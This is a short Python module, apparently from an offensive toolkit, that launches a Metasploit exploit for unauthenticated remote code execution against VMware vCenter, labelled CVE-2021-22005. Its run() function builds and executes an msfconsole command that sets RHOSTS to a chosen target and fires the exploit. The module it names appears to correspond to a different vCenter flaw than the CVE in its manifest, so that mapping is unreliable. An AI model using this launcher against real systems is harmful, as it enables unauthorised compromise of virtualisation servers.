"""CloudXPL-Forge — vCenter Analytics File Upload RCE (CVE-2021-22005)."""

from __future__ import annotations

MANIFEST: dict = {
    "name": "vCenter Analytics File Upload RCE (CVE-2021-22005)",
    "cve": "CVE-2021-22005",
    "mitre": ["T1190"],
    "description": "Exploits analytics file upload vulnerability in vCenter 6.7/7.0 for unauthenticated RCE. MSF module available.",
    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2021-22005"],
}


import shutil
import subprocess
import sys


def run(args):
    msfconsole = shutil.which("msfconsole")
    if not msfconsole:
        print("[!] msfconsole not found — install Metasploit Framework", file=sys.stderr)
        return 1

    target = getattr(args, "target", None) or getattr(args, "vcenter_host", "") or ""
    cmd = [
        msfconsole, "-q", "-x",
        f"use exploit/multi/http/vmware_vcenter_uploadova_rce; "
        + (f"set RHOSTS {target}; " if target else "")
        + "run; exit",
    ]
    if getattr(args, "verbose", False):
        print(f"[*] Running: {' '.join(cmd)}")
    return subprocess.call(cmd)
